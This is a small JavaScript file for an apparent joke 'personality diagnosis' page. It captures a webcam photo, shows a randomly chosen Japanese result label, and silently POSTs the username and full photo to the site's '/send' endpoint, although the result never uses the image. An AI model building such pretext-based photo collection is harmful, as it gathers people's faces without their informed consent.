let stream;

async function startCamera() {
  stream = await navigator.mediaDevices.getUserMedia({ video: true });
  document.getElementById('video').srcObject = stream;
}

// ランダム診断の候補
const diagnoses = [
  "未来のCEOタイプ 💼",
  "おだやか癒し系 😊",
  "天才肌クリエイター 🎨",
  "努力型リーダー 🏆",
  "超集中ストイック型 🧠",
  "ちょっと天然なムードメーカー 🍀",
  "計算高い策略家 🕵️‍♂️",
  "まじめな秀才 📚",
  "運だけで生きてる強運タイプ 🍀",
  "魅力で全てを解決するカリスマ 😎"
];

function capture() {
  const username = document.getElementById('username').value || "名無し";
  const canvas = document.getElementById('canvas');
  const video = document.getElementById('video');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext('2d').drawImage(video, 0, 0);

  const dataUrl = canvas.toDataURL('image/png');
  const diagnosis = diagnoses[Math.floor(Math.random() * diagnoses.length)];

  document.getElementById('result').textContent = `${username}さんの診断結果：${diagnosis}`;

  fetch('/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, image: dataUrl, diagnosis })
  }).then(res => res.json()).then(data => {
    console.log(data.message);
  });
}